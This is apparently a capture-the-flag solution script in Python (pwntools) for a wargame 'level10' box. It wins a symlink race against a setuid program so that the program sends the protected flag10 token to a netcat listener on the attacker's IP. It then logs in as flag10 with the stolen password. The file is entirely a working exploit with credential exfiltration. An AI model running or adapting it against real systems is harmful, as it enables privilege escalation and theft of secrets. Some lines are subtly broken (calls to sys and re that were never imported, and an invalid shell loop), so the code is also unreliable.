#!/usr/bin/python3

from pwn import *
from sys import argv,exit
from re import search

if len(argv) < 3:
	sys.exit(f"{argv[0]} Target_IP Local_IP") 

level10 = ssh(host=argv[1],user='level10',password='level10')
remote_pro = level10.shell('sh')
remote_pro.sendline(f'touch /tmp/linkme')
remote_pro.sendline(f'while (:;); do ln -sf /home/flag10/token /tmp/faketoken;ln -sf /tmp/linkme /tmp/faketoken ; done &')
local_pro = process(['nc','-kl','18211'])
for i in range(10):
	remote_pro.sendline(f'/home/flag10/flag10 /tmp/faketoken {argv[2]}')
data = local_pro.recvall(timeout=1)
remote_pro.kill()
level10.close()

flag10_password = re.search('.........*', data.decode())[0]

flag10 = ssh(host=argv[1],user='flag10',password=flag10_password)
flag10_shell = flag10.shell('sh')
flag10_shell.sendline('getflag')
flag10_shell.interactive(prompt="")
